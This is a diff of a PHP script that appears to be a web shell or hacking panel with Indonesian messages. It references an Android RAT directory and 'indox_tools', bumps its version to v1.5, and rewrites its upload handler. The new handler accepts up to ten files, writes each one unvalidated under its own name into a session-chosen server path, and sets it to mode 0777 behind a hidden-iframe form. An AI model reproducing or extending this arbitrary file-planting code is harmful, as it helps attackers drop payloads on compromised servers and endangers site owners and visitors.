@@ -3,7 +3,7 @@
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 
-$version = "v1.4";
+$version = "v1.5";
 
 if(isset($_GET['rat-android-siapa'])) {
         $path = dirname(__FILE__)."/rat/android/";
@@ -362,17 +362,27 @@ if(isset($_GET['indox_tools'])) {
     }
 }
 
-//file upload
-if(isset($_FILES['file'])){
-    if(copy($_FILES['file']['tmp_name'], $_SESSION['path'].'/'.$_FILES['file']['name']))
-    {
-        echo '<script>alert("SUKSES upload lihat di: '.$_SESSION['path'].'");</script>';
+//move file upload
+while(list($key,$value) = each($_FILES['file']['name']))
+{
+    if(!empty($value)){ 
+        //$filename = rand(1,100000).$value;
+        //$filename = str_replace(" ","_",$filename);
+        $filename = $value;
+
+        $add = $_SESSION['path']."/$filename";
+            
+        if(copy($_FILES['file']['tmp_name'][$key], $add))
+        {
+            echo '<script>alert("SUKSES UPLOAD: '.$filename.'");</script>';
+        }
+        else{
+            echo '<script>alert("GAGAL UPLOAD: '.$filename.'");</script>';
+        }
+        chmod("$add",0777);
     }
-    else{
-        echo '<script>alert("GAGAL upload");</script>';
-    }
-    unset($_SESSION['path']);
 }
+// input upload handle
 if (isset($_GET['uploader'])) 
 {
     $session_upload = ini_get("session.upload_progress.name");
@@ -382,10 +392,16 @@ if (isset($_GET['uploader']))
                 <div id="bar_color"></div>
             </div>
             <div id="status"></div>
-            <form action="" method="POST" id="myForm" enctype="multipart/form-data" target="hidden_iframe">
-                <input type="hidden" value="myForm" name="'.$session_upload.'">
-                <input type="file" name="file"><br>
-                <input type="submit" value="Start Upload">
+            <form action="" method="POST" id="myForm" enctype="multipart/form-data" target="hidden_iframe">';
+
+                for ($i=0; $i<10; $i++) {
+                    echo '<input type="hidden" value="myForm" name="'.$session_upload.'">';
+                    echo '<input type="file" name="file[]">';
+                }
+
+                echo'
+                <br><br>
+                <input type="submit" value="Start Upload">&nbsp&nbsp
             </form>
             <iframe id="hidden_iframe" name="hidden_iframe" src="about:blank"></iframe>
             <script type="text/javascript">
